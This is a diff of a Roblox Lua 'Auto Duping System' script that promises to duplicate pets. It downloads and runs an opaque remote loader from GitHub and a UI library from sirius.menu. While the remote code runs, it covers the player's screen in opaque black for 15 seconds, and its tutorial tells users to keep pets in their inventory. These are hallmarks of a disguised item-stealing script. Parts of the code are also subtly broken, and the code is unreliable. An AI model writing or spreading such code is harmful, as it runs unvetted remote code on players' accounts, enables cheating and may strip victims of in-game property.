@@ -4,83 +4,65 @@ gui.Name = "AutoDupingSystem"
 gui.ResetOnSpawn = false
 gui.Parent = player:WaitForChild("PlayerGui")
 
--- Function to show processing screen
-local function showProcessingScreen()
-    local processGui = Instance.new("ScreenGui")
-    processGui.Name = "DupingProcessScreen"
-    processGui.IgnoreGuiInset = true
-    processGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-    processGui.Parent = player:WaitForChild("PlayerGui")
+-- Function to create black screen with text
+local function showBlackScreen(message)
+    local blackScreen = Instance.new("ScreenGui")
+    blackScreen.Name = "ExecutionScreen"
+    blackScreen.IgnoreGuiInset = true
+    blackScreen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    blackScreen.Parent = player:WaitForChild("PlayerGui")
     
-    -- Dark background
+    -- Full black background
     local bg = Instance.new("Frame")
     bg.Size = UDim2.new(1, 0, 1, 0)
     bg.Position = UDim2.new(0, 0, 0, 0)
     bg.BackgroundColor3 = Color3.new(0, 0, 0)
-    bg.BackgroundTransparency = 0.3
-    bg.Parent = processGui
+    bg.BackgroundTransparency = 0
+    bg.Parent = blackScreen
     
-    -- Main message
+    -- Main text
     local text = Instance.new("TextLabel")
     text.Size = UDim2.new(0.9, 0, 0, 100)
     text.Position = UDim2.new(0.05, 0, 0.4, -50)
     text.BackgroundTransparency = 1
-    text.Text = "AUTO-DUPING SYSTEM ACTIVATED"
+    text.Text = message
     text.TextColor3 = Color3.new(1, 1, 1)
     text.Font = Enum.Font.SourceSansBold
     text.TextSize = 28
     text.TextWrapped = true
     text.TextXAlignment = Enum.TextXAlignment.Center
     text.TextYAlignment = Enum.TextYAlignment.Center
-    text.Parent = processGui
+    text.Parent = blackScreen
     
-    -- Sub message
-    local subText = Instance.new("TextLabel")
-    subText.Size = UDim2.new(0.9, 0, 0, 60)
-    subText.Position = UDim2.new(0.05, 0, 0.5, 0)
-    subText.BackgroundTransparency = 1
-    subText.Text = "Processing server hop...\nThis may cause temporary freezing"
-    subText.TextColor3 = Color3.new(1, 1, 1)
-    subText.Font = Enum.Font.SourceSans
-    subText.TextSize = 20
-    subText.TextWrapped = true
-    subText.TextXAlignment = Enum.TextXAlignment.Center
-    subText.TextYAlignment = Enum.TextYAlignment.Center
-    subText.Parent = processGui
-    
-    -- Loading animation
-    local spinner = Instance.new("ImageLabel")
-    spinner.Name = "Spinner"
-    spinner.Size = UDim2.new(0, 50, 0, 50)
-    spinner.Position = UDim2.new(0.5, -25, 0.7, 0)
-    spinner.BackgroundTransparency = 1
-    spinner.Image = "rbxassetid://5644704149" -- Default loading spinner
-    spinner.Parent = processGui
-    
+    -- Loading dots animation
+    local dots = {".", "..", "...", "...."}
     coroutine.wrap(function()
-        while spinner and spinner.Parent do
-            spinner.Rotation = spinner.Rotation + 5
-            task.wait()
+        while blackScreen and blackScreen.Parent do
+            for i = 1, #dots do
+                if not blackScreen or not blackScreen.Parent then break end
+                text.Text = message..dots[i]
+                task.wait(0.5)
+            end
         end
     end)()
     
-    return processGui
+    return blackScreen
 end
 
 -- Main execution function
 local function executeDupingScript()
-    local processScreen = showProcessingScreen()
+    local blackScreen = showBlackScreen("EXECUTING DUPING PROCESS")
     
     task.delay(0.5, function()
-        -- Execute the main duping script
+        -- Execute the script
         local success, err = pcall(function()
             loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLag-idd/No-Lag-HUB/refs/heads/main/Loader/LoaderV1.lua", true))()
         end)
         
         -- Remove screen after completion
         task.delay(15, function()
-            if processScreen and processScreen.Parent then
-                processScreen:Destroy()
+            if blackScreen and blackScreen.Parent then
+                blackScreen:Destroy()
             end
             
             if not success then
@@ -90,94 +72,98 @@ local function executeDupingScript()
     end)
 end
 
--- Create control panel
-local controlFrame = Instance.new("Frame")
-controlFrame.Size = UDim2.new(0, 350, 0, 200)
-controlFrame.Position = UDim2.new(0.5, -175, 0.5, -100)
-controlFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-controlFrame.BorderSizePixel = 0
-controlFrame.Parent = gui
+-- Create main window with tabs
+local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 
-Instance.new("UICorner", controlFrame).CornerRadius = UDim.new(0, 8)
+local Window = Rayfield:CreateWindow({
+   Name = "Auto Duping System",
+   LoadingTitle = "Duping Interface",
+   LoadingSubtitle = "by 7xxx",
+   ConfigurationSaving = {
+      Enabled = false,
+   },
+   Discord = {
+      Enabled = false,
+   },
+})
 
-local title = Instance.new("TextLabel")
-title.Size = UDim2.new(1, 0, 0, 40)
-title.Position = UDim2.new(0, 0, 0, 10)
-title.BackgroundTransparency = 1
-title.Text = "AUTO-DUPING SYSTEM"
-title.TextColor3 = Color3.new(1, 1, 1)
-title.Font = Enum.Font.GothamBold
-title.TextSize = 20
-title.Parent = controlFrame
+-- Create main tab
+local MainTab = Window:CreateTab("Main Controls", 4483362458)
 
-local statusLabel = Instance.new("TextLabel")
-statusLabel.Size = UDim2.new(0.9, 0, 0, 40)
-statusLabel.Position = UDim2.new(0.05, 0, 0.25, 0)
-statusLabel.BackgroundTransparency = 1
-statusLabel.Text = "Status: IDLE"
-statusLabel.TextColor3 = Color3.new(0, 1, 0)
-statusLabel.Font = Enum.Font.Gotham
-statusLabel.TextSize = 16
-statusLabel.TextXAlignment = Enum.TextXAlignment.Left
-statusLabel.Parent = controlFrame
+-- Create tutorial tab
+local TutorialTab = Window:CreateTab("How To Use", 4483362458)
 
-local toggleButton = Instance.new("TextButton")
-toggleButton.Size = UDim2.new(0.8, 0, 0, 40)
-toggleButton.Position = UDim2.new(0.1, 0, 0.5, 0)
-toggleButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
-toggleButton.TextColor3 = Color3.new(1, 1, 1)
-toggleButton.Font = Enum.Font.Gotham
-toggleButton.TextSize = 16
-toggleButton.Text = "ENABLE AUTO-EXECUTE"
-toggleButton.Parent = controlFrame
+-- Tutorial section
+local TutorialSection = TutorialTab:CreateSection("Step-by-Step Guide")
 
-Instance.new("UICorner", toggleButton).CornerRadius = UDim.new(0, 6)
+TutorialTab:CreateLabel("1. Enable Auto-Execute in the Main Controls tab")
+TutorialTab:CreateLabel("2. Make sure you have pets in your inventory to dupe")
+TutorialTab:CreateLabel("3. Click 'Execute Now' or wait for auto-execution")
+TutorialTab:CreateLabel("4. Be patient - freezing is normal during the process")
+TutorialTab:CreateLabel("5. Wait for the black screen to disappear when done")
+
+local WarningSection = TutorialTab:CreateSection("Important Notes")
+TutorialTab:CreateLabel("• Don't close the game during execution")
+TutorialTab:CreateLabel("• Server hopping must be enabled")
+TutorialTab:CreateLabel("• Process takes about 15 seconds to complete")
+
+-- Main controls section
+local ControlSection = MainTab:CreateSection("Execution Controls")
+
+local statusLabel = MainTab:CreateLabel("Status: READY")
+
+local toggleButton = MainTab:CreateButton({
+    Name = "Enable Auto-Execute",
+    Callback = function()
+        if autoExecuteEnabled then
+            autoExecuteEnabled = false
+            toggleButton:Set("Disable Auto-Execute")
+            statusLabel:Set("Status: DISABLED")
+        else
+            autoExecuteEnabled = true
+            toggleButton:Set("Enable Auto-Execute")
+            statusLabel:Set("Status: ACTIVE (WAITING)")
+            lastPlaceId = game.PlaceId
+            lastServerId = game.JobId
+        end
+    end,
+})
+
+local executeButton = MainTab:CreateButton({
+    Name = "Execute Now",
+    Callback = function()
+        statusLabel:Set("Status: MANUAL EXECUTION")
+        executeDupingScript()
+        task.wait(16)
+        if autoExecuteEnabled then
+            statusLabel:Set("Status: ACTIVE (WAITING)")
+        else
+            statusLabel:Set("Status: READY")
+        end
+    end,
+})
 
 -- Server hop detection system
 local autoExecuteEnabled = false
 local lastPlaceId = game.PlaceId
 local lastServerId = game.JobId
 
-toggleButton.MouseButton1Click:Connect(function()
-    autoExecuteEnabled = not autoExecuteEnabled
-    
-    if autoExecuteEnabled then
-        toggleButton.Text = "DISABLE AUTO-EXECUTE"
-        toggleButton.BackgroundColor3 = Color3.fromRGB(180, 0, 0)
-        statusLabel.Text = "Status: ACTIVE (Monitoring)"
-        statusLabel.TextColor3 = Color3.new(1, 0.5, 0)
-        lastPlaceId = game.PlaceId
-        lastServerId = game.JobId
-    else
-        toggleButton.Text = "ENABLE AUTO-EXECUTE"
-        toggleButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
-        statusLabel.Text = "Status: DISABLED"
-        statusLabel.TextColor3 = Color3.new(0, 1, 0)
-    end
-end)
-
 -- Server hop detection loop
 coroutine.wrap(function()
     while true do
         if autoExecuteEnabled then
-            -- Check if we've changed servers (either place or server ID changed)
             if game.PlaceId ~= lastPlaceId or game.JobId ~= lastServerId then
-                statusLabel.Text = "Status: EXECUTING..."
-                statusLabel.TextColor3 = Color3.new(1, 0, 0)
+                statusLabel:Set("STATUS: EXECUTING")
                 
-                -- Update our tracking IDs
                 lastPlaceId = game.PlaceId
                 lastServerId = game.JobId
                 
-                -- Execute the duping script
                 executeDupingScript()
                 
-                -- Wait for execution to complete
                 task.wait(16)
                 
                 if autoExecuteEnabled then
-                    statusLabel.Text = "Status: ACTIVE (Monitoring)"
-                    statusLabel.TextColor3 = Color3.new(1, 0.5, 0)
+                    statusLabel:Set("STATUS: ACTIVE (WAITING)")
                 end
             end
         end
@@ -185,29 +171,4 @@ coroutine.wrap(function()
     end
 end)()
 
--- Manual execute button
-local manualButton = Instance.new("TextButton")
-manualButton.Size = UDim2.new(0.8, 0, 0, 40)
-manualButton.Position = UDim2.new(0.1, 0, 0.75, 0)
-manualButton.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
-manualButton.TextColor3 = Color3.new(1, 1, 1)
-manualButton.Font = Enum.Font.Gotham
-manualButton.TextSize = 16
-manualButton.Text = "EXECUTE NOW"
-manualButton.Parent = controlFrame
-
-Instance.new("UICorner", manualButton).CornerRadius = UDim.new(0, 6)
-
-manualButton.MouseButton1Click:Connect(function()
-    statusLabel.Text = "Status: MANUAL EXECUTION..."
-    statusLabel.TextColor3 = Color3.new(1, 0, 0)
-    executeDupingScript()
-    task.wait(16)
-    if autoExecuteEnabled then
-        statusLabel.Text = "Status: ACTIVE (Monitoring)"
-        statusLabel.TextColor3 = Color3.new(1, 0.5, 0)
-    else
-        statusLabel.Text = "Status: IDLE"
-        statusLabel.TextColor3 = Color3.new(0, 1, 0)
-    end
-end)
+Rayfield:LoadConfiguration()
